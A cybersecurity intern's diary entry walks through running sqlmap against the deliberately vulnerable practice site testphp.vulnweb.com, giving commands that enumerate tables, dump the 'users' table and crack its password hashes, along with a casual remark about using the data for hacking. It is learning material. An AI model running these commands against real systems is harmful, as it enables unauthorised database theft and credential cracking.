# Cyber Security Internship Diary

Welcome back to my Cyber Security Internship Diary! This repository documents my daily learnings and experiences during my internship in the field of Cyber Security. Here, I'll share insights, concepts, and practices that I encounter throughout this journey.

# Day-11: SQLMAP on the testable website.

## Overview
Today, Open-source tool automating SQL injection detection and exploitation, aiding in database security assessments.

### The website which is used is [testphp.vulnweb](http://testphp.vulnweb.com/)
In this we have used the automating SQL injection which enter's a webpages database and then throw back all the data which is in the database.

### Steps & proccedure :
#### 1. Installing the sqlmap into your kali linux. 
```
 sudo apt-get update
 sudo apt-get upgrade -y
 sudo apt-get install sqlmap
```
#### 2. Understanding the sqlmap workinng 

``` man sqlmap ```

![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-11/man%20sql.png?raw=true)

#### 3. performing attack 
```
sqlmap -u <website link> http://testphp.vulnweb.com/listproducts.php?cat=1  -dbs
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-11/start.png)

#### 4. Getting the Database deatils 
After getting the deatils of the Database managament (DBMS) of the database and with that we will also get the tables and coloumns of the database now we target the 
(DBMS) and in that the tables we target so, for that the command is 
```
 sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-11/get%20table.png)

#### 5. Dump the data 
After getting the deatils of the tables which the database has then we procced and download all the Data which the 'user' contain. 
```
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=2 -D acuart -T users --dump-all
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-11/dump%20all.png)

 - The important condition statement which are asked while executing
 ```
writing hashes to a temporary file '/tmp/sqlmapkis89bs647009/sqlmaphashes-aaiq4oy_.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
```

![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-11/-y%20perfroming.png)

- The dictionary attack use the general default given by the sqlmap
```
using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
```

![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-11/-y%20dictorinary.png)

- This step is important regarding the time taking while cracking the hash i would pefer to do it as it crack it precisely without this also it works fine
``` 
using default dictionary
do you want to use common password suffixes? (slow!) [y/N] Y
``` 
- future just agree and Y

#### After that the data is saved as the .csv file and by default all the tables is dumped and stored and the path is given at the last where it stored 
``` /home/kali/.local/share/sqlmap/output/testphp.vulnweb.com ```

![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-11/final%20path.png)

#### Now just cd into the directory and cat the files and use the data for you hacking purpose. 

### Conclusion 
SQLMAP is a automated sql injection tool which is used to get into database and it is very powerfull tool which also gives us a full access of the database. 

##  USE WITH CAUTION!. 

### See you tomorrow! 
